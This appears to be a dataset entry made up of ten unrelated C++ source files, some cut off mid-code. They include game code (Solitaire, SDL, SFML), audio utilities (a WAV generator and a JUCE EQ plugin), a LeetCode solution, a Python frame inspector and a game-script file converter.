    "#include \"pch.h\"\n#include \"AssetManager.h\"\n#include \"SfmlHelpers.h\"\n#include <algorithm>\n#include <SFML/Audio.hpp>\n#include <cassert>\n\nAssetManager::AssetManager() {\n\tchar path[MAX_PATH];\n\t::GetModuleFileNameA(nullptr, path, _countof(path));\n\t*strrchr(path, L'\\\\') = 0;\n\tm_TexturesDir = std::string(path) + \"\\\\Textures\\\\\";\n\tm_FontsDir = std::string(path) + \"\\\\Fonts\\\\\";\n}\n\nbool AssetManager::LoadTexture(std::string const& fileName, std::string name) {\n\tsf::Texture texture;\n\tif (!texture.loadFromFile(m_TexturesDir + fileName))\n\t\treturn false;\n\n\tif (name.empty()) {\n\t\tname = SfmlHelpers::GetNameFromFileName(fileName);\n\t}\n\treturn m_Textures.try_emplace(std::move(name), texture).second;\n}\n\nsf::Texture const& AssetManager::Texture(std::string const& name) const {\n\treturn m_Textures.at(name);\n}\n\nsf::Texture& AssetManager::Texture(std::string const& name) {\n\treturn m_Textures.at(name);\n}\n\nbool AssetManager::LoadFont(std::string const& fileName, std::string name) {\n\tsf::Font font;\n\tif (!font.loadFromFile(m_FontsDir + fileName)) {\n\t\tassert((\"Failed to load font \", false));\n\t\treturn false;\n\t}\n\n\tif (name.empty()) {\n\t\tname = SfmlHelpers::GetNameFromFileName(fileName);\n\t}\n\n\treturn m_Fonts.try_emplace(std::move(name), std::move(font)).second;\n}\n\nsf::Font const& AssetManager::Font(std::string const& name) const {\n\treturn m_Fonts.at(name);\n}\n\nbool AssetManager::LoadSound(std::string const& fileName, std::string name) {\n\tsf::SoundBuffer sound;\n\tif (!sound.loadFromFile(m_AudioDir + fileName))\n\t\treturn false;\n\n\tif (name.empty()) {\n\t\tname = SfmlHelpers::GetNameFromFileName(fileName);\n\t}\n\treturn m_Audio.try_emplace(std::move(name), std::move(sound)).second;\n}\n\nsize_t AssetManager::NoCaseHash::operator()(std::string const& str) const {\n\tstd::string s1(str);\n\tstd::transform(s1.begin(), s1.end(), s1.begin(), ::tolower);\n\treturn std::hash<std::string>()(s1);\n}\n\nbool AssetManager::StringNoCaseEqual::operator()(std::string const& lhs, std::string const& rhs) const {\n\treturn _stricmp(lhs.c_str(), rhs.c_str()) == 0;\n}\n",
    "/* An image smoother is a filter of the size 3 x 3 that can be applied to each cell of an image by rounding down the average of the cell and the eight surrounding cells \n(i.e., the average of the nine cells in the blue smoother). \n  If one or more of the surrounding cells of a cell is not present, we do not consider it in the average \n  (i.e., the average of the four cells in the red smoother). */\n\n    Approach: 1.We make note of all 9 directions and traverse through matrix in all directions and make sum of all values and then do avg i.e sum/count. here we check whether they are inbound and then make sum\n               and strore in O(mxn) matric T.C:O(mxn) S.C : O(mxn)\n              2. As we add the prev row and left of current elements value get effected. So, we just store that in 1vector and top_corner variable in other variable and then using them we make sum\n                 and make change in th egiven matrix only.TC:O(mxn) , SC:O(n)\nclass Solution {\npublic:\n   \n    vector<vector<int>> imageSmoother(vector<vector<int>>& img) {\n        //row size\n        int m = img.size();\n        //col size\n        int n = img[0].size();\n\n        vector<int>prev(n);\n        int top_corner=0;\n        for(int i=0;i<m;i++){\n            for(int j=0;j<n;j++){\n\n                int sum = 0;\n                int cnt = 0;\n                \n                // add bottom row [i+1]\n                if(i+1<m){\n                   \n                    if(j-1>=0){\n                        sum+=img[i+1][j-1];\n                        cnt++;\n                    }\n                    sum+=img[i+1][j];\n                    cnt++;\n                    if(j+1<n){\n                        sum+=img[i+1][j+1];\n                        cnt++;\n                    }\n                }\n                //right neighbour\n                if(j+1<n){\n                   sum+=img[i][j+1];\n                   cnt++; \n                }\n                \n                //current cell\n                sum+=img[i][j];\n                cnt++;\n\n                //left cell[i][j-1]\n                if(j-1>=0){\n                    sum+=prev[j-1];\n                    cnt++;\n                }\n                //top row\n                if(i-1>=0){\n                    //[i-1][j-1]->top_corner\n                    if(j-1>=0){\n                        sum+=top_corner;\n                        cnt++;\n                    }\n                    //[i-1][j],  [i-1][j+1]\n                    sum+=prev[j];\n                    cnt++;\n\n                    if(j+1<n){\n                        sum+=prev[j+1];\n                        cnt++;\n                    }\n                }\n                //store prev value of prev row\n                if(i-1>=0){\n                    top_corner = prev[j];\n                }\n                // store current value of [i][j]\n                prev[j]=img[i][j];\n\n                img[i][j] = sum/cnt;\n            }\n        }\n        return img;\n    }\n};\n\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <cmath>\r\n#include <cstdint>\r\n\r\nusing namespace std;\r\n\r\nconst int SAMPLE_RATE = 44100; // \u91c7\u6837\u7387\uff0c\u6807\u51c6\u97f3\u9891\u91c7\u6837\u7387\u4e3a 44.1 kHz\r\n\r\n// \u5199\u5165 WAV \u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f\r\nvoid writeWavHeader(ofstream &file, int dataSize)\r\n{\r\n    int fileSize = 44 + dataSize; // 44 \u5b57\u8282\u7684\u5934\u90e8 + \u6570\u636e\r\n    file.write(\"RIFF\", 4);        // Chunk ID\r\n    file.write(reinterpret_cast<const char *>(&fileSize), 4); // Chunk Size\r\n    file.write(\"WAVE\", 4);        // Format\r\n    file.write(\"fmt \", 4);        // Subchunk1 ID\r\n    int subchunk1Size = 16;       // Subchunk1 Size (PCM \u56fa\u5b9a\u4e3a 16)\r\n    file.write(reinterpret_cast<const char *>(&subchunk1Size), 4);\r\n    int audioFormat = 1;          // PCM \u97f3\u9891\u683c\u5f0f\r\n    file.write(reinterpret_cast<const char *>(&audioFormat), 2);\r\n    int numChannels = 1;          // \u5355\u58f0\u9053\r\n    file.write(reinterpret_cast<const char *>(&numChannels), 2);\r\n    file.write(reinterpret_cast<const char *>(&SAMPLE_RATE), 4); // \u91c7\u6837\u7387\r\n    int byteRate = SAMPLE_RATE * numChannels * 2; // ByteRate = \u91c7\u6837\u7387 \u00d7 \u901a\u9053\u6570 \u00d7 \u6bcf\u4e2a\u6837\u672c\u5b57\u8282\u6570\r\n    file.write(reinterpret_cast<const char *>(&byteRate), 4);\r\n    int blockAlign = numChannels * 2; // \u6bcf\u5e27\u5b57\u8282\u6570 = \u901a\u9053\u6570 \u00d7 \u6bcf\u4e2a\u6837\u672c\u5b57\u8282\u6570\r\n    file.write(reinterpret_cast<const char *>(&blockAlign), 2);\r\n    int bitsPerSample = 16;      // \u6bcf\u4e2a\u6837\u672c 16 \u4f4d\r\n    file.write(reinterpret_cast<const char *>(&bitsPerSample), 2);\r\n    file.write(\"data\", 4);       // Subchunk2 ID\r\n    file.write(reinterpret_cast<const char *>(&dataSize), 4); // Subchunk2 Size\r\n}\r\n\r\n// \u4e3b\u51fd\u6570\r\nint main()\r\n{\r\n    double f; // \u9891\u7387\uff08Hz\uff09\r\n    double A; // \u632f\u5e45\uff080 \u5230 1 \u7684\u503c\uff09\r\n    double t; // \u65f6\u957f\uff08\u79d2\uff09\r\n\r\n    cout << \"\u8bf7\u8f93\u5165\u9891\u7387 (Hz): \";\r\n    cin >> f;\r\n    cout << \"\u8bf7\u8f93\u5165\u632f\u5e45 (0 \u5230 1): \";\r\n    cin >> A;\r\n    cout << \"\u8bf7\u8f93\u5165\u65f6\u957f (\u79d2): \";\r\n    cin >> t;\r\n\r\n    if (A < 0 || A > 1 || f <= 0 || t <= 0)\r\n    {\r\n        cerr << \"\u8f93\u5165\u65e0\u6548\uff0c\u8bf7\u786e\u4fdd\u9891\u7387 > 0\uff0c\u632f\u5e45\u5728 0 \u5230 1 \u4e4b\u95f4\uff0c\u65f6\u957f > 0\uff01\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    int totalSamples = static_cast<int>(SAMPLE_RATE * t); // \u603b\u6837\u672c\u6570\r\n    int16_t *buffer = new int16_t[totalSamples]; // 16 \u4f4d\u6574\u6570\u8868\u793a\u7684\u6837\u672c\u6570\u636e\r\n    double twoPiF = 2 * M_PI * f;\r\n\r\n    // \u751f\u6210\u6b63\u5f26\u6ce2\u6837\u672c\r\n    for (int i = 0; i < totalSamples; ++i)\r\n    {\r\n        double t = static_cast<double>(i) / SAMPLE_RATE;\r\n        buffer[i] = static_cast<int16_t>(A * 32767 * sin(twoPiF * t));\r\n    }\r\n\r\n    // \u5199\u5165 WAV \u6587\u4ef6\r\n    ofstream wavFile(\"output.wav\", ios::binary);\r\n    if (!wavFile)\r\n    {\r\n        cerr << \"\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6\uff01\" << endl;\r\n        delete[] buffer;\r\n        return 1;\r\n    }\r\n\r\n    int dataSize = totalSamples * 2; // \u6bcf\u4e2a\u6837\u672c 2 \u5b57\u8282\r\n    writeWavHeader(wavFile, dataSize);\r\n    wavFile.write(reinterpret_cast<const char *>(buffer), dataSize);\r\n\r\n    wavFile.close();\r\n    delete[] buffer;\r\n\r\n    cout << \"\u751f\u6210\u5b8c\u6210\uff01\u6587\u4ef6\u5df2\u4fdd\u5b58\u4e3a output.wav\" << endl;\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <random>\r\n#include <map>\r\n#include <stack>\r\n#include \"raylib.h\"\r\n\r\nusing namespace std;\r\nstruct insideCard\r\n{\r\n    string rank;\r\n    string suit;\r\n    insideCard(string r, string s)\r\n    {\r\n        rank = r;\r\n        suit = s;\r\n    }\r\n\r\n    insideCard() = default;\r\n};\r\nstruct CardNode\r\n{\r\n    // CardNode structure representing a node in the doubly linked list\r\n    insideCard* card; // Represent the card as a string (e.g., \"Ace of Hearts\")\r\n    CardNode* prev;   // Pointer to the previous card in the list\r\n    CardNode* next;   // Pointer to the next card in the list\r\n    bool faceUp;\r\n\r\n    // Constructor to initialize the card and set prev/next to nullptr\r\n    CardNode(string ranks, string shapes, bool facingUp = false)\r\n    {\r\n        card = new insideCard(ranks, shapes);\r\n        prev = next = nullptr;\r\n        this->faceUp = facingUp;\r\n    }\r\n    ~CardNode()\r\n    {\r\n        delete card; // Clean up memory\r\n        card = nullptr;\r\n    }\r\n};\r\nstruct ClickableCard\r\n{\r\n    Rectangle bounds;\r\n    int tableauIndex;\r\n    int cardsCount;\r\n    ClickableCard(Vector2 position, int from, int count = 1)\r\n    {\r\n        bounds = { position.x, position.y, 80, 109 };\r\n        tableauIndex = from;\r\n        cardsCount = count;\r\n    }\r\n};\r\nstruct GameState\r\n{\r\n    vector<CardNode*> tableaus[7];   // Current state of tableau piles\r\n    vector<CardNode*> foundation[4]; // Current state of foundation piles\r\n    vector<CardNode*> waste;         // Current state of the waste pile\r\n    vector<CardNode*> stock;         // Current state of the stock pile\r\n\r\n    GameState() = default;\r\n};\r\nclass Solitaire\r\n{\r\npublic:\r\n    vector<CardNode*> tableau[7];     // Doubly linked lists for 7 tableau piles\r\n    vector<CardNode*> stock;          // Doubly linked list for the stock\r\n    vector<CardNode*> waste;          // Doubly linked list for the waste\r\n    vector<CardNode*> foundations[4]; // Doubly linked lists for the 4 foundation piles\r\n    stack<GameState> undoStack;\r\n    stack<ClickableCard*> drawStack;\r\n    ClickableCard* selected = nullptr;\r\n    Texture2D atlas;\r\n\r\n    Solitaire()\r\n    {\r\n        initializeDeck();\r\n        shuffleDeck();\r\n        setupTableau();\r\n    }\r\n\r\n    ~Solitaire()\r\n    {\r\n        // Clean up dynamically allocated memory in the game\r\n        clearPile(stock);\r\n        clearPile(waste);\r\n\r\n        for (int i = 0; i < 7; ++i)\r\n        {\r\n            clearPile(tableau[i]);\r\n        }\r\n\r\n        for (int i = 0; i < 4; ++i)\r\n        {\r\n            clearPile(foundations[i]);\r\n        }\r\n    }\r\n\r\n    void clearPile(vector<CardNode*>& pile)\r\n    {\r\n        for (CardNode* card : pile)\r\n        {\r\n            delete card; // Delete each card\r\n        }\r\n        pile.clear(); // Clear the vector\r\n    }\r\n\r\n    // Initialize the deck and store it as a doubly linked list\r\n    void initializeDeck()\r\n    {\r\n        string suits[] = { \"Hearts\", \"Diamonds\", \"Clubs\", \"Spades\" };\r\n        string ranks[] = { \"A\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"J\", \"Q\", \"K\" };\r\n\r\n        for (const auto& suit : suits)\r\n        {\r\n            for (const auto& rank : ranks)\r\n            {\r\n                string rr = rank;\r\n                string ss = suit;\r\n                stock.push_back(new CardNode(rr, ss)); // Add new card as node in stock\r\n            }\r\n        }\r\n    }\r\n\r\n    /*void debugDeck() {\r\n        cout << \"Deck cards:\" << endl;\r\n        for (CardNode* node : stock) {\r\n            cout << node->card->rank << \" of \" << node->card->suit << endl;\r\n        }\r\n    }\r\n    */\r\n\r\n    // Shuffle the deck using random number generation\r\n    void shuffleDeck()\r\n    {\r\n        random_device rd;\r\n        mt19937 g(rd());\r\n        shuffle(stock.begin(), stock.end(), g);\r\n    }\r\n\r\n    void saveState()\r\n    {\r\n        GameState currentState;\r\n\r\n        for (int i = 0; i < 7; ++i)\r\n        {\r\n            currentState.tableaus[i].clear();\r\n            for (CardNode* card : tableau[i])\r\n            {\r\n                // Create a new CardNode for the state\r\n                CardNode* newCard = new CardNode(card->card->rank, card->card->suit, card->faceUp);\r\n                currentState.tableaus[i].push_back(newCard);\r\n            }\r\n        }\r\n\r\n        for (int i = 0; i < 4; ++i)\r\n        {\r\n            currentState.foundation[i] = foundations[i]; // Assuming similar deep copy for foundations\r\n        }\r\n\r\n        // Similar deep copy for waste and stock\r\n        currentState.waste = waste;\r\n        currentState.stock = stock;\r\n\r\n        undoStack.push(currentState);\r\n    }\r\n\r\n    void undo()\r\n    {\r\n        if (undoStack.empty())\r\n        {\r\n            return;\r\n        }\r\n\r\n        GameState previousState = undoStack.top();\r\n        undoStack.pop();\r\n\r\n        // Restore tableau states\r\n        for (int i = 0; i < 7; ++i)\r\n        {\r\n            tableau[i] = previousState.tableaus[i];\r\n\r\n            // Restore the faceUp state for each card\r\n   ",
    "//Mason Crippen\n//Jack Fontenot\n//Connor Griffin\n//Andrei Kuvshinikov\n\n\n#include \"token.h\"\n\ntoken::token(){\n    _color = color(0, 0, 0);\n    center.x = center.y = 0;\n    radius = 1;\n}\n\ntoken::token(int r, color c, point p){\n    radius = r;\n    _color = c;\n    center.x = p.x;\n    center.y = p.y;\n}\n\nvoid token::setColor(color c){\n    _color = c;\n}\n\ncolor token::getColor(){\n    return _color;\n}\n\nvoid token::setCenter(point p){\n    center.x = p.x;\n    center.y = p.y;\n}\n\npoint token::getCenter(){\n    return center;\n}\n\nvoid token::setRadius(int r){\n    radius = r;\n}\n\nint token::getRadius(){\n    return radius;\n}\n\nvoid token::draw(SDL_Plotter& g){\n    for(int i = 0; i < 360; i++){\n        drawLine(secPoint(i,center).x, center.y, secPoint(i,center).x, secPoint(i,center).y, _color.R, _color.G, _color.B, g);\n    }\n}\n\nvoid token::erase(SDL_Plotter& g,color c){\n    for(int i = 0; i < 360; i++){\n        drawLine(secPoint(i,center).x, center.y, secPoint(i,center).x, secPoint(i,center).y, c.R, c.G, c.B, g);\n    }\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\nclass Movie\n{\nprivate:\n    std::string title;\n    std::string genre;\n    double duration; // Duration in minutes\n\npublic:\n    Movie(std::string t, std::string g, double d)\n        : title(t), genre(g), duration(d) {}\n    void displayInfo() const\n    {\n        std::cout << \"Title: \" << title << \"\\n\"\n                  << \"Genre: \" << genre << \"\\n\"\n                  << \"Duration: \" << duration << \" minutes\\n\";\n    }\n\n    std::string getTitle() const\n    {\n        return title;\n    }\n};\nclass StreamingService\n{\nprivate:\n    std::vector<Movie> movies;\n\npublic:\n    void addMovie(const Movie &movie)\n    {\n        movies.push_back(movie);\n        std::cout << \"Movie added successfully!\\n\";\n    }\n    void displayMovies() const\n    {\n        if (movies.empty())\n        {\n            std::cout << \"No movies available.\\n\";\n            return;\n        }\n\n        std::cout << \"\\nAvailable Movies:\\n\";\n        for (size_t i = 0; i < movies.size(); ++i)\n        {\n            std::cout << i + 1 << \". \";\n            movies[i].displayInfo();\n            std::cout << \"\\n\";\n        }\n    }\n    void streamMovie(int index) const\n    {\n        if (index >= 0 && index < movies.size())\n        {\n            std::cout << \"Streaming: \" << movies[index].getTitle() << \"\\n\";\n            std::cout << \"Enjoy your movie!\\n\";\n        }\n        else\n        {\n            std::cout << \"Invalid movie index!\\n\";\n        }\n    }\n    size_t getMoviesCount() const\n    { // Added method to get the count of movies\n        return movies.size();\n    }\n};\nint main()\n{\n    StreamingService service;\n\n    int choice;\n\n    do\n    {\n        std::cout << \"\\n=== Online Movie Streaming Service ===\\n\";\n        std::cout << \"1. Add Movie\\n\";\n        std::cout << \"2. Display Movies\\n\";\n        std::cout << \"3. Stream Movie\\n\";\n        std::cout << \"4. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice)\n        {\n        case 1:\n        {\n            std::string title, genre;\n            double duration;\n\n            std::cin.ignore(); // Clear input buffer\n            std::cout << \"Enter movie title: \";\n            getline(std::cin, title);\n\n            std::cout << \"Enter movie genre: \";\n            getline(std::cin, genre);\n\n            std::cout << \"Enter movie duration (in minutes): \";\n            std::cin >> duration;\n\n            service.addMovie(Movie(title, genre, duration));\n            break;\n        }\n        case 2:\n            service.displayMovies();\n            break;\n        case 3:\n        {\n            int index;\n            service.displayMovies();\n\n            if (service.getMoviesCount() == 0)\n            {          // Check if there are any movies\n                break; // No movies to stream\n            }\n\n            std::cout << \"\\nEnter the movie index to stream: \";\n            std::cin >> index;\n\n            service.streamMovie(index - 1); // Adjusting for zero-based index\n            break;\n        }\n        case 4:\n            std::cout << \"Exiting the system.\\n\";\n            break;\n        default:\n            std::cout << \"Invalid choice! Please try again.\\n\";\n        }\n\n    } while (choice != 4);\n\n    return 0;\n}\n",
    "/*\n  ==============================================================================\n\n    This file contains the basic framework code for a JUCE plugin processor.\n\n  ==============================================================================\n*/\n\n#include \"PluginProcessor.h\"\n#include \"PluginEditor.h\"\n\n//==============================================================================\nSimpleEQAudioProcessor::SimpleEQAudioProcessor()\n#ifndef JucePlugin_PreferredChannelConfigurations\n     : AudioProcessor (BusesProperties()\n                     #if ! JucePlugin_IsMidiEffect\n                      #if ! JucePlugin_IsSynth\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\n                      #endif\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\n                     #endif\n                       )\n#endif\n{\n}\n\nSimpleEQAudioProcessor::~SimpleEQAudioProcessor()\n{\n}\n\n//==============================================================================\nconst juce::String SimpleEQAudioProcessor::getName() const\n{\n    return \"SimpleEQ\";\n}\n\nbool SimpleEQAudioProcessor::acceptsMidi() const\n{\n   #if JucePlugin_WantsMidiInput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool SimpleEQAudioProcessor::producesMidi() const\n{\n   #if JucePlugin_ProducesMidiOutput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool SimpleEQAudioProcessor::isMidiEffect() const\n{\n   #if JucePlugin_IsMidiEffect\n    return true;\n   #else\n    return false;\n   #endif\n}\n\ndouble SimpleEQAudioProcessor::getTailLengthSeconds() const\n{\n    return 0.0;\n}\n\nint SimpleEQAudioProcessor::getNumPrograms()\n{\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\n                // so this should be at least 1, even if you're not really implementing programs.\n}\n\nint SimpleEQAudioProcessor::getCurrentProgram()\n{\n    return 0;\n}\n\nvoid SimpleEQAudioProcessor::setCurrentProgram (int index)\n{\n}\n\nconst juce::String SimpleEQAudioProcessor::getProgramName (int index)\n{\n    return {};\n}\n\nvoid SimpleEQAudioProcessor::changeProgramName (int index, const juce::String& newName)\n{\n}\n\n//==============================================================================\nvoid SimpleEQAudioProcessor::prepareToPlay (double sampleRate, int samplesPerBlock)\n{\n    // Use this method as the place to do any pre-playback\n    // initialisation that you need..\n\n    juce::dsp::ProcessSpec spec;\n\n    spec.maximumBlockSize = samplesPerBlock;\n\n    spec.numChannels = 1;\n\n    spec.sampleRate = sampleRate;\n\n    leftChain.prepare(spec);\n    rightChain.prepare(spec);\n\n    auto chainSettings = getChainSettings(apvts);\n\n    updateFilters();\n}\n\nvoid SimpleEQAudioProcessor::releaseResources()\n{\n    // When playback stops, you can use this as an opportunity to free up any\n    // spare memory, etc.\n}\n\n#ifndef JucePlugin_PreferredChannelConfigurations\nbool SimpleEQAudioProcessor::isBusesLayoutSupported (const BusesLayout& layouts) const\n{\n  #if JucePlugin_IsMidiEffect\n    juce::ignoreUnused (layouts);\n    return true;\n  #else\n    // This is the place where you check if the layout is supported.\n    // In this template code we only support mono or stereo.\n    // Some plugin hosts, such as certain GarageBand versions, will only\n    // load plugins that support stereo bus layouts.\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\n        return false;\n\n    // This checks if the input layout matches the output layout\n   #if ! JucePlugin_IsSynth\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\n        return false;\n   #endif\n\n    return true;\n  #endif\n}\n#endif\n\nvoid SimpleEQAudioProcessor::processBlock (juce::AudioBuffer<float>& buffer, juce::MidiBuffer& midiMessages)\n{\n    juce::ScopedNoDenormals noDenormals;\n    auto totalNumInputChannels  = getTotalNumInputChannels();\n    auto totalNumOutputChannels = getTotalNumOutputChannels();\n\n    // In case we have more outputs than inputs, this code clears any output\n    // channels that didn't contain input data, (because these aren't\n    // guaranteed to be empty - they may contain garbage).\n    // This is here to avoid people getting screaming feedback\n    // when they first compile a plugin, but obviously you don't need to keep\n    // this code if your algorithm always overwrites all the output channels.\n    for (auto i = totalNumInputChannels; i < totalNumOutputChannels; ++i)\n        buffer.clear (i, 0, buffer.getNumSamples());\n\n    auto chainSettings = getChainSettings(apvts);\n\n    updateFilters();\n\n    juce::dsp::AudioBlock<float> block(buffer);\n\n    auto leftBlock = block.getSingleChannelBlock(0);\n    auto rightBlock = block.getSingleChannelBlock(1);\n\n    juce::dsp::ProcessContextReplacing<float> leftContext(leftBlock);\n    juce::dsp::ProcessContextReplacing<float> rightContext(rightBlock);\n\n    leftChain.process(",
    "#include \"py_frame.h\"\n\n#include <Python.h>\n#include <frameobject.h>\n#include <pybind11/pybind11.h>\n\n#include <sstream>\n#include <string>\n#include <vector>\n\ntypedef struct PythonFrame {\n    std::string file_name;\n    std::string func_name;\n    size_t func_first_lineno;\n    size_t lineno;\n\n    PythonFrame(const std::string &file_name, const std::string &func_name,\n                size_t func_first_lineno, size_t lineno)\n            : file_name(file_name),\n            func_name(func_name),\n            func_first_lineno(func_first_lineno),\n            lineno(lineno) {}\n}PythonFrame_t;\n\nclass PyFrameChecker {\npublic:\n    // Return the current python frames with a query or using the previous cached frames\n    std::vector<PythonFrame_t> &get_frames(bool cached = false);\n\n    // Get the singleton instance\n    static PyFrameChecker &instance();\n\nprivate:\n    PyFrameChecker() {}\n\n    std::string unpack_pyobject(PyObject *obj);\n\nprivate:\n    // Cached frames for each thread\n    static inline thread_local std::vector<PythonFrame_t> _frames;\n};\n\n\n\nPyFrameChecker& PyFrameChecker::instance() {\n    static PyFrameChecker monitor;\n    return monitor;\n}\n\n// Take from PyTorch::THPUtils_unpackStringView\nstd::string PyFrameChecker::unpack_pyobject(PyObject* obj) {\n    if (PyBytes_Check(obj)) {\n        size_t size = PyBytes_GET_SIZE(obj);\n        return std::string(PyBytes_AS_STRING(obj), size);\n    }\n    if (PyUnicode_Check(obj)) {\n        // NOLINTNEXTLINE(cppcoreguidelines-init-variables)\n        Py_ssize_t size;\n        const char* data = PyUnicode_AsUTF8AndSize(obj, &size);\n        if (!data) {\n            // If we get any runtime error, just return an empty string to continue running\n            // printf(\"obj %p utf8 parsing error\", obj);\n            return \"\";\n        }\n        return std::string(data, (size_t)size);\n    }\n    // printf(\"obj %p not bytes or unicode\", obj);\n    return \"\";\n}\n\nstd::vector<PythonFrame_t>& PyFrameChecker::get_frames(bool cached) {\n    if (cached) {\n        return _frames;\n    }\n\n    // GIL lock is required\n    pybind11::gil_scoped_acquire gil;\n\n    PyFrameObject* frame = PyEval_GetFrame();\n    _frames.clear();\n\n    while (nullptr != frame) {\n        size_t lineno = PyFrame_GetLineNumber(frame);\n        size_t func_first_lineno = frame->f_code->co_firstlineno;\n        std::string file_name = unpack_pyobject(frame->f_code->co_filename);\n        std::string func_name = unpack_pyobject(frame->f_code->co_name);\n        _frames.emplace_back(PythonFrame_t{file_name, func_name, func_first_lineno, lineno});\n        frame = frame->f_back;\n    }\n    return _frames;\n}\n\nbool get_python_frames(std::vector<PythonFrame_t> &frames) {\n    auto &frame_checker = PyFrameChecker::instance();\n    frames = frame_checker.get_frames();    \n\n    return frames.size() > 0;\n}\n\nstd::string print_pyframes(int verbose) {\n    std::vector<PythonFrame_t> python_frames;\n    get_python_frames(python_frames);\n\n    std::stringstream ss;\n    for (size_t i = 0; i < python_frames.size(); i++) {\n        ss << \"f-\" << std::to_string(i) << \" \"\n           << std::string(python_frames[i].file_name) << \":\"\n           << std::to_string(python_frames[i].lineno) << \"  def \"\n           << std::string(python_frames[i].func_name) << \"() \"\n           << std::string(python_frames[i].file_name) << \":\"\n           << std::to_string(python_frames[i].func_first_lineno)\n           << std::endl;\n    }\n\n    if (verbose) {\n        printf(\"%s\", ss.str().c_str());\n        fflush(stdout);\n    }\n\n    return ss.str();\n}\n\n\nstd::vector<std::string> get_pyframes(int keep) {\n    std::vector<PythonFrame_t> python_frames;\n    get_python_frames(python_frames);\n\n    std::vector<std::string> frames;\n    for (size_t i = 0; i < python_frames.size(); i++) {\n        if (keep >= 0 && i >= keep) {\n            break;\n        }\n\n        std::stringstream ss;\n        ss << \"f-\" << std::to_string(i) << \" \"\n           << std::string(python_frames[i].file_name) << \":\"\n           << std::to_string(python_frames[i].lineno) << \"  def \"\n           << std::string(python_frames[i].func_name) << \"()\";\n\n        frames.push_back(ss.str());\n    }\n\n    return frames;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n#define gc getchar_unlocked\n#define fo(i, n) for (int i = 0; i < n; i++)\n#define Fo(i, k, n) for (i = k; k < n ? i < n : i > n; k < n ? i += 1 : i -= 1)\n#define ll long long\n#define deb(x) cout << #x << \"=\" << x << endl\n#define pb push_back\n#define mp make_pair\n#define F first\n#define S second\n#define all(x) x.begin(), x.end()\n#define clr(x) memset(x, false, sizeof(x))\n#define sortall(x) sort(all(x))\n#define tr(it, a) for (auto it = a.begin(); it != a.end(); it++)\n#define PI 3.1415926535897932384626\n#define mod 1000000007\ntypedef pair<int, int> pii;\ntypedef pair<ll, ll> pl;\ntypedef vector<int> vi;\ntypedef vector<ll> vl;\ntypedef vector<pii> vpii;\ntypedef vector<pl> vpl;\ntypedef vector<vi> vvi;\ntypedef vector<vl> vvl;\nint main()\n{\n#ifndef ONLINE_JUDGE\n    freopen(\"input.txt\", \"r\", stdin);\n    freopen(\"output.txt\", \"w\", stdout);\n#endif\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        //write code here\n       \n    }\n    return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <cstring>\n#include <locale>\n\nvoid displayCredits() {\n    // Configurar o local para UTF-8\n    std::setlocale(LC_ALL, \"\");\n\n    // Usar caracteres simples para compatibilidade universal\n    std::cout << \"\\033[1;34m\"  // Cor azul brilhante\n              << \"+==================================+\\n\"\n              << \"|                                  |\\n\"\n              << \"| \\033[1;33m       DK Source - Kevin\\033[1;34m         |\\n\"\n              << \"|                                  |\\n\"\n              << \"+==================================+\\n\"\n              << \"\\033[0m\";  // Resetar cores\n    std::cout << \"\\033[1;32mConversor de Arquivos npcscript.inf/txt!\\033[0m\\n\\n\";\n}\n\nvoid checkStringLength(size_t length, size_t maxLength = 2048) {\n    if (length >= maxLength) {\n        throw std::runtime_error(\"String muito longa: \" + std::to_string(length));\n    }\n}\n\nvoid convertInfToTxt(const std::string& inputFile, const std::string& outputFile) {\n    std::ifstream inf(inputFile, std::ios::binary);\n    std::ofstream txt(outputFile);\n\n    if (!inf.is_open() || !txt.is_open()) {\n        throw std::runtime_error(\"Erro ao abrir arquivos.\");\n    }\n\n    int npcScriptCount;\n    inf.read(reinterpret_cast<char*>(&npcScriptCount), sizeof(npcScriptCount));\n    txt << \"NpcScriptCount=\" << npcScriptCount << \"\\n\";\n\n    for (int i = 1; i <= npcScriptCount; ++i) {\n        int id;\n        inf.read(reinterpret_cast<char*>(&id), sizeof(id));\n        txt << \"[\" << i << \"]\\nID=\" << id << \"\\n\";\n\n        int strLength;\n        char buffer[2048];\n\n        inf.read(reinterpret_cast<char*>(&strLength), sizeof(strLength));\n        checkStringLength(strLength);\n        inf.read(buffer, strLength);\n        buffer[strLength] = '\\0';\n        txt << \"OwnerID=\" << buffer << \"\\n\";\n\n        int subjectCount;\n        inf.read(reinterpret_cast<char*>(&subjectCount), sizeof(subjectCount));\n        txt << \"SubjectCount=\" << subjectCount << \"\\n\";\n\n        for (int j = 1; j <= subjectCount; ++j) {\n            inf.read(reinterpret_cast<char*>(&strLength), sizeof(strLength));\n            checkStringLength(strLength);\n            inf.read(buffer, strLength);\n            buffer[strLength] = '\\0';\n            std::string value = buffer;\n            std::replace(value.begin(), value.end(), '\\n', '#');\n            txt << \"Subject\" << j << \"=\" << value << \"\\n\";\n        }\n\n        int contentCount;\n        inf.read(reinterpret_cast<char*>(&contentCount), sizeof(contentCount));\n        txt << \"ContentCount=\" << contentCount << \"\\n\";\n\n        for (int j = 1; j <= contentCount; ++j) {\n            inf.read(reinterpret_cast<char*>(&strLength), sizeof(strLength));\n            checkStringLength(strLength);\n            inf.read(buffer, strLength);\n            